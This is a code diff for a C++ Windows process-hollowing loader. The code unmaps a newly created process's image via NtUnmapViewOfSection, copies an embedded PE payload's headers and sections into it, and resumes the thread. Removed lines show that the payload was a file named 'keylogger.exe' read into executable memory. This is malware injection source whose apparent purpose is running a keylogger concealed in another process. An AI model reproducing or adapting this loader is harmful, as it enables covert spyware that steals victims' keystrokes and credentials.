@@ -7,20 +7,8 @@ typedef NTSTATUS (NTAPI* ntunmap)(
 	 PVOID  BaseAddress
 );
 
-PVOID get_payload_byte(LPCSTR payload_name) {
-	HANDLE hPayload = CreateFileA(payload_name, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
-	if (hPayload == INVALID_HANDLE_VALUE) {
-		cout << "Can't open file payload\n";
-		return 0;
-	}
-	DWORD payload_size = GetFileSize(hPayload, NULL);
-	PVOID pbuf = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (!ReadFile(hPayload, pbuf, payload_size, NULL, NULL)) {
-		cout << "Can't read file\n";
-		return 0;
-	}
-	return pbuf;
-}
+
+
 DWORD call_nt_unmapp(HANDLE  hProcess, PVOID target_base_address) {
 	HMODULE hDLL = LoadLibraryA("ntdll.dll");
 	ntunmap nt_unmapSection = (ntunmap)GetProcAddress(hDLL, "NtUnmapViewOfSection");
@@ -61,13 +49,7 @@ int main() {
 	if (!call_nt_unmapp(target_process_information->hProcess, target_base_address)) {
 		cout << "Error unmapping\n";
 	}
-	/*
-		LPCSTR payload_name = "keylogger.exe";
-	PVOID pbuf = get_payload_byte(payload_name);
-	if (!pbuf) {
-		return 0;
-	}
-	*/
+
 	
 
 	PIMAGE_DOS_HEADER payload_dos = (PIMAGE_DOS_HEADER)byte_key;
@@ -88,7 +70,7 @@ int main() {
 		payload_nt->OptionalHeader.SizeOfHeaders,
 		NULL
 	);
-	//cout << "(PVOID)(DWORD)byte_key:" << (PVOID)(DWORD)byte_key<<'\n';
+	//write section header
 	for (int i = 0; i < payload_nt->FileHeader.NumberOfSections; i++) {
 		PIMAGE_SECTION_HEADER payload_section = (PIMAGE_SECTION_HEADER)((DWORD)byte_key + payload_dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)) );
 		
@@ -108,7 +90,7 @@ int main() {
 	ResumeThread(target_process_information->hThread);
 	CloseHandle(target_process_information->hProcess);
 	CloseHandle(target_process_information->hThread);
-	//VirtualFree(pbuf,0,MEM_RELEASE);
+
 	return 0;
 
 
